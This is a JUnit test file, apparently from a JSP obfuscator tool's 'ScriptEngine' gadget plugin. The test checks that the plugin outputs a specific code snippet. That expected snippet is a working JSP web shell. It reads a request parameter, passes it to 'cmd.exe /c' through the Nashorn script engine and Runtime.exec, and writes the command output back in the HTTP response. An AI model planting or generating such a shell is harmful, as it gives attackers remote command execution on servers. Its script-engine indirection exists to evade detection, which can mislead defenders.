package com.t3stzer0.jspobfuscator.plugins.extensions.Gadget;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContextAdapter;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

class ScriptEngineTest {

  @Test
  void testScriptEngine() {
    ScriptEngine ext = new ScriptEngine();
    ExtensionContextAdapter ctx = new ExtensionContextAdapter();
    ext.initExtension(ctx);
    ctx.setStringInput("CommandParameter", "xxx");
    ctx.setSelectInput("System", 1);
    ext.getCode(ctx);
    assertEquals(1, ext.getCode(ctx).size());
    String expected =
"""
String s = "s=[3];s[0]='cmd.exe';s[1]='/c';s[2]='" + request.getParameter("xxx") + "';java.lang.Runtime.getRuntime().exec(s);";
Process process = (Process) new ScriptEngineManager().getEngineByName("nashorn").eval(s);
StringBuilder stringBuilder = new StringBuilder();
BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
String line;
while((line = bufferedReader.readLine()) != null) {
    stringBuilder.append(line).append("\\n");
}
response.getOutputStream().write(stringBuilder.toString().getBytes());
""";
    assertEquals(expected, ext.getCode(ctx).get(0));
  }
}
